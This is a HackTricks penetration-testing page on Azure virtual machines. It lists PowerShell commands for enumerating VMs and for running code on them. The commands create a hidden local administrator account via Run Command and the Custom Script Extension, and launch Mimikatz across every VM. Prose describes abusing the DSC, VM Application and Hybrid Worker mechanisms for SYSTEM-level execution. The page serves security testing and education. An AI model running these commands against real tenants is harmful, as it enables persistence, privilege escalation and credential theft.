# Az - Virtual Machines

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Basic information

Azure virtual machines are one of several types of [on-demand, scalable computing resources](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree) that Azure offers. Typically, you choose a virtual machine when you need more control over the computing environment than the other choices offer. This article gives you information about what you should consider before you create a virtual machine, how you create it, and how you manage it.

## Enumeration

```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```

## **Run commands in a VM**

### **Run Command**

```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' ‚ÄìVerbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd 
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```

### **Run Custom Script Extension**

Azure virtual machine (VM) extensions are **small applications** that provide post-deployment configuration and automation **tasks** on **Azure VMs**. For example, if a virtual machine requires software installation, antivirus protection, or the ability to run a script inside it, you can use a VM extension.

Therefore, if you have access to write it, you can execute arbitrary code:

```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```

### DesiredConfigurationState

**DesiredConfigurationState (DSC)** is similar to Ansible, but is a tool within PowerShell that allows a host to be setup through code. DSC has its own extension in Azure which allows the upload of **configuration files**. DSC [configuration files](https://docs.microsoft.com/en-us/powershell/dsc/getting-started/wingettingstarted?view=dsc-1.1#define-a-configuration-and-generate-the-configuration-document) are quiet picky when it comes to syntax, however the DSC extension is very gullible and will **blindly execute any command** anything as long as it follows a certain format, as shown in figure 5.

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

This can be done via the **Az PowerShell** function [**`Publish-AzvmdscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0). The DSC extension requires a **.PS1** with a **function** and **packaged** in a **.zip** file. Since this actually isn‚Äôt correct DSC syntax, the extension status will read as ‚Äúfailure‚Äù, however the code will be executed. The issue with this is that there is no output of the command, as the status is overwritten with the failure message.

### VM Application Definitions

The [VM Applications](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications) resource is a way to **deploy versioned applications repeatably** to an Azure VM. For example, if you create a **program** and **deploy** it to all Azure VMs as version 1.0, once you **update** the program **to 1.1**, you can use the same VM Application to **create another definition** and push the update out to any VM.\
Being able to **push out an application** to a VM means it‚Äôs another avenue for **code execution**. This method‚Äôs drawback is that setting up the Application Definition [**requires a few steps**](https://docs.microsoft.com/en-us/azure/virtual-machines/vm-applications-how-to?tabs=portal), but can be accomplished using the **`New-AzGalleryApplication`** and **`New-AzGalleryApplicationVersion`** cmdlets in Az PowerShell.

This technique works by utilizing an **extension ‚ÄúVMAppExtension‚Äù** which is automatically installed when applying an application to a VM. The extension downloads the file from the URI to disk as the name of the Application _exactly_, meaning if application name is ‚ÄòAzApplication‚Äô, the file on disk is also called ‚ÄòAzApplication‚Äô with no extension. This requires the ‚ÄúManageActions‚Äù field in the [REST API call](https://docs.microsoft.com/en-us/rest/api/compute/gallery-application-versions/create-or-update) to be configured to rename the application with the appropriate extension. If you don‚Äôt want to run an entire application, arbitrary PowerShell commands can be run by also abusing the ManageActions field in the same REST API method or also through the Azure Portal. Once set up, the definition will be similar to figure 8.

<figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

This execution technique is unfortunately slow (about 3-4 minutes to execute an app or command), however with it being relatively new I would be surprised if there‚Äôs any specific detections written.

Since it‚Äôs an extension that ultimately does the execution, a copy of the application is located at `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\` and the status of the execution is kept in `C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`.

### Hybrid Worker Groups

[**Hybrid Worker Groups**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker) (HWGs) allow a configured **Runbook** in an Automation Account to be **ran** on an **Azure Virtual machine** that is part of the **configured HWG**. Once again, an **extension is used** on the VM to deploy the Runbook code onto the VM. Since an extension is used, credentials are irrelevant and the code is executed as **SYSTEM** or root.

<figure><img src="../../.gitbook/assets/image (2) (5).png" alt=""><figcaption></figcaption></figure>

If using a Windows 10 VM, it‚Äôs important to have the Runbook run as PowerShell Version 5.1 instead of 7.1, as 7.1 isn‚Äôt installed on the VMs by default and the script will fail to run.

## References

* [https://learn.microsoft.com/en-us/azure/virtual-machines/overview](https://learn.microsoft.com/en-us/azure/virtual-machines/overview)
* [https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/](https://hausec.com/2022/05/04/azure-virtual-machine-execution-techniques/)

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* If you want to see your **company advertised in HackTricks** or if you want access to the **latest version of the PEASS or download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
